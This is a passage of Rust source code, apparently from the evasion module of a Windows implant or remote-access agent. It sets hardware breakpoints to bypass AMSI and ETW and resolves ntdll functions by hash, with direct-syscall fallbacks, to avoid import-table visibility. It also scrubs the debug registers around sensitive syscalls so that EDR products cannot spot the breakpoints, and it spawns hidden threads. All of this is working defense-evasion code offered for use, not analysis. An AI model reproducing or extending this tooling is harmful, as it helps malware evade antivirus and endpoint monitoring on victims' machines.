    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};

    let amsi = AMSI_ADDR.load(Ordering::Relaxed);
    let etw = ETW_ADDR.load(Ordering::Relaxed);
    if amsi == 0 && etw == 0 {
        return; // HWBPs not yet configured; skip silently
    }

    // Resolve Nt* context variants from ntdll via PEB walk to reduce
    // visibility (same pattern as setup_hardware_breakpoints).
    type NtGetContextThreadFn =
        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
    type NtSetContextThreadFn =
        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;

    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0);
    let nt_get_ctx: Option<NtGetContextThreadFn> = if ntdll != 0 {
        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtGetContextThread\0"))
            .map(|a| std::mem::transmute(a))
    } else {
        None
    };
    let nt_set_ctx: Option<NtSetContextThreadFn> = if ntdll != 0 {
        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtSetContextThread\0"))
            .map(|a| std::mem::transmute(a))
    } else {
        None
    };

    if nt_set_ctx.is_none() {
        log::warn!(
            "evasion: apply_hwbp_to_current_thread: SetThreadContext fallback path in use for debug register modification"
        );
    }

    // GetCurrentThread() pseudo-handle = (-2)
    let h: winapi::um::winnt::HANDLE = (-2isize) as *mut _;

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Save original context for restoration on verification failure.
    let mut orig_ctx: CONTEXT = std::mem::zeroed();
    orig_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    let orig_saved = if let Some(nt_get) = nt_get_ctx {
        let status = nt_get(h, &mut orig_ctx);
        if status >= 0 {
            true
        } else {
            let s = crate::syscall!(
                "NtGetContextThread",
                h as u64,
                &mut orig_ctx as *mut _ as u64
            );
            s.is_ok() && s.unwrap() >= 0
        }
    } else {
        let s = crate::syscall!(
            "NtGetContextThread",
            h as u64,
            &mut orig_ctx as *mut _ as u64
        );
        s.is_ok() && s.unwrap() >= 0
    };

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    let got_ctx = if let Some(nt_get) = nt_get_ctx {
        let status = nt_get(h, &mut ctx);
        if status < 0 {
            log::warn!(
                "evasion: apply_hwbp_to_current_thread: NtGetContextThread failed (status=0x{:08x}), falling back to syscall",
                status as u32
            );
            let s = crate::syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
            s.is_ok() && s.unwrap() >= 0
        } else {
            true
        }
    } else {
        let s = crate::syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
        s.is_ok() && s.unwrap() >= 0
    };

    if !got_ctx {
        log::warn!(
            "evasion: apply_hwbp_to_current_thread: GetThreadContext failed — skipping HWBP setup"
        );
        return;
    }

    hwbp_set_slots(&mut ctx, amsi, etw);

    let set_ok = if let Some(nt_set) = nt_set_ctx {
        let status = nt_set(h, &mut ctx);
        if status < 0 {
            log::warn!(
                "evasion: apply_hwbp_to_current_thread: NtSetContextThread failed (status=0x{:08x}), falling back to syscall",
                status as u32
            );
            let s = crate::syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
            s.is_ok() && s.unwrap() >= 0
        } else {
            true
        }
    } else {
        let s = crate::syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
        s.is_ok() && s.unwrap() >= 0
    };

    if !set_ok {
        log::warn!(
            "evasion: apply_hwbp_to_current_thread: SetThreadContext failed — debug registers not modified"
        );
        return;
    }

    // Verify SetThreadContext by re-reading and comparing Dr0/Dr1/Dr7.
    let mut verify_ctx: CONTEXT = std::mem::zeroed();
    verify_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    let verify_ok = if let Some(nt_get) = nt_get_ctx {
        let status = nt_get(h, &mut verify_ctx);
        if status >= 0 {
            true
        } else {
            let s = crate::syscall!(
                "NtGetContextThread",
                h as u64,
                &mut verify_ctx as *mut _ as u64
            );
            s.is_ok() && s.unwrap() >= 0
        }
    } else {
        let s = crate::syscall!(
            "NtGetContextThread",
            h as u64,
            &mut verify_ctx as *mut _ as u64
        );
        s.is_ok() && s.unwrap() >= 0
    };

    if !verify_ok || !hwbp_slots_match(&verify_ctx, &ctx) {
        let (actual0, actual1) = hwbp_slot_values(&verify_ctx);
        let (expected0, expected1) = hwbp_slot_values(&ctx);
        log::warn!(
            "evasion: apply_hwbp_to_current_thread: SetThreadContext verification failed — HWBP0={:#x} (expected {:#x}), HWBP1={:#x} (expected {:#x}), restoring original context",
            actual0, expected0,
            actual1, expected1,
        );
        // Restore original debug registers.
        if orig_saved {
            let _ = if let Some(nt_set) = nt_set_ctx {
                nt_set(h, &mut orig_ctx)
            } else {
                let s = crate::syscall!(
                    "NtSetContextThread",
                    h as u64,
                    &mut orig_ctx as *mut _ as u64
                );
                if s.is_ok() && s.unwrap() >= 0 {
                    0i32
                } else {
                    -1i32
                }
            };
        }
    }
}

/// Tear down all evasion mechanisms so the agent can shut down cleanly.
///
/// Removes the VEH handler (if registered) via `RemoveVectoredExceptionHandler`
/// and clears the AMSI / ETW breakpoint addresses so any remaining hardware
/// breakpoints become benign (they will no longer match `Rip`).
///
/// # Safety
///
/// Must be called before process exit.  After this call returns, AMSI and ETW
/// are no longer bypassed.  Call from the agent shutdown path.
#[cfg(windows)]
pub unsafe fn disable_evasion() {
    type RemoveVehFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> u32;

    let handle = VEH_HANDLE.load(Ordering::Acquire);
    if handle != 0 {
        // Resolve RemoveVectoredExceptionHandler dynamically from kernel32.
        if let Some(k32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
            if let Some(addr) = pe_resolve::get_proc_address_by_hash(
                k32,
                pe_resolve::hash_str(b"RemoveVectoredExceptionHandler\0"),
            ) {
                let remove_veh: RemoveVehFn = std::mem::transmute(addr);
                remove_veh(handle as *mut _);
                log::info!("evasion: VEH handler removed (handle={:#x})", handle);
            }
        }
        VEH_HANDLE.store(0, Ordering::Release);
    }

    // Clear hardware breakpoint addresses so stale Dr0/Dr1 values no longer
    // trigger the (now-removed) VEH handler.
    AMSI_ADDR.store(0, Ordering::Relaxed);
    ETW_ADDR.store(0, Ordering::Relaxed);
    RET_GADGET.store(0, Ordering::Relaxed);
}

/// No-op on non-Windows.
#[cfg(not(windows))]
pub unsafe fn disable_evasion() {}

// ── Debug register scrubbing ───────────────────────────────────────────────
//
// EDR products may capture thread context (Dr0–Dr3) during syscall hooks to
// detect hardware breakpoints on ntdll functions.  These helpers temporarily
// clear Dr0/Dr1 around sensitive syscalls so the debug registers appear clean
// to any EDR context capture.

/// Saved hardware-breakpoint slot addresses.
#[cfg(windows)]
struct SavedDebugRegs {
    dr0: u64,
    dr1: u64,
}

/// Save Dr0 and Dr1 from the current thread, then clear them.
///
/// Returns the saved values so they can be restored with
/// [`restore_debug_regs`].  Uses `NtGetContextThread` /
/// `NtSetContextThread` resolved dynamically from ntdll (no IAT entries).
#[cfg(windows)]
unsafe fn save_and_clear_debug_regs() -> SavedDebugRegs {
    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};

    let amsi = AMSI_ADDR.load(Ordering::Relaxed);
    let etw = ETW_ADDR.load(Ordering::Relaxed);
    if amsi == 0 && etw == 0 {
        // HWBPs not active — nothing to save/clear.
        return SavedDebugRegs { dr0: 0, dr1: 0 };
    }

    // Resolve NtGetContextThread / NtSetContextThread from ntdll.
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0);
    if ntdll == 0 {
        return SavedDebugRegs { dr0: 0, dr1: 0 };
    }

    type NtGetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
    type NtSetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;

    let nt_get: Option<NtGetCtxFn> =
        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtGetContextThread\0"))
            .map(|a| std::mem::transmute(a));

    let nt_set: Option<NtSetCtxFn> =
        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtSetContextThread\0"))
            .map(|a| std::mem::transmute(a));

    let h = (-1isize) as winapi::um::winnt::HANDLE; // NtCurrentThread()

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Get current context.
    let got = if let Some(nt_get_fn) = nt_get {
        nt_get_fn(h, &mut ctx) >= 0
    } else {
        let s = crate::syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
        s.is_ok() && s.unwrap() >= 0
    };

    if !got {
        return SavedDebugRegs { dr0: 0, dr1: 0 };
    }

    let (slot0, slot1) = hwbp_slot_values(&ctx);
    let saved = SavedDebugRegs {
        dr0: slot0,
        dr1: slot1,
    };

    // Only clear if they actually hold our breakpoint addresses.
    let before_clear = hwbp_slot_values(&ctx);
    hwbp_clear_if_owned(&mut ctx, amsi, etw);
    if hwbp_slot_values(&ctx) != before_clear {
        if let Some(nt_set_fn) = nt_set {
            nt_set_fn(h, &mut ctx);
        } else {
            let _ = crate::syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
        }
    }

    saved
}

/// Restore previously saved Dr0/Dr1 values on the current thread.
#[cfg(windows)]
unsafe fn restore_debug_regs(saved: SavedDebugRegs) {
    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};

    if saved.dr0 == 0 && saved.dr1 == 0 {
        return; // Nothing to restore.
    }

    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0);
    if ntdll == 0 {
        return;
    }

    type NtSetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;

    let nt_set: Option<NtSetCtxFn> =
        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtSetContextThread\0"))
            .map(|a| std::mem::transmute(a));

    let h = (-1isize) as winapi::um::winnt::HANDLE;

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Get current context to preserve Dr7 settings.
    type NtGetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
    let nt_get: Option<NtGetCtxFn> =
        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtGetContextThread\0"))
            .map(|a| std::mem::transmute(a));

    let got = if let Some(nt_get_fn) = nt_get {
        nt_get_fn(h, &mut ctx) >= 0
    } else {
        let s = crate::syscall!("NtGetContextThread", h as u64, &mut ctx as *mut _ as u64);
        s.is_ok() && s.unwrap() >= 0
    };

    if !got {
        return;
    }

    hwbp_restore_slots(&mut ctx, &saved);

    if let Some(nt_set_fn) = nt_set {
        nt_set_fn(h, &mut ctx);
    } else {
        let _ = crate::syscall!("NtSetContextThread", h as u64, &mut ctx as *mut _ as u64);
    }
}

/// Execute `f` with debug registers scrubbed (Dr0/Dr1 cleared).
///
/// This prevents EDR products from observing hardware breakpoint addresses
/// in the thread context during the execution of `f`.  The breakpoints are
/// restored on return (or panic).
///
/// Typically used to wrap sensitive syscalls where EDR might capture thread
/// context (e.g., `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`).
///
/// # Safety
///
/// This function is safe to call from any thread.  The closure `f` should not
/// rely on AMSI/ETW breakpoints firing during its execution.
#[cfg(windows)]
pub fn with_scrubbed_debug_regs<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    unsafe {
        let saved = save_and_clear_debug_regs();
        let result = f();
        restore_debug_regs(saved);
        result
    }
}

/// No-op on non-Windows.
#[cfg(not(windows))]
pub fn with_scrubbed_debug_regs<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    f()
}

pub fn spawn_hidden_thread<F, T>(f: F) -> std::thread::JoinHandle<T>
where
    F: FnOnce() -> T + Send + 'static,
    T: Send + 'static,
{
    std::thread::spawn(move || {
        #[cfg(windows)]
        unsafe {
            apply_hwbp_to_current_thread();
        }
        hide_current_thread();
        f()
    })
}
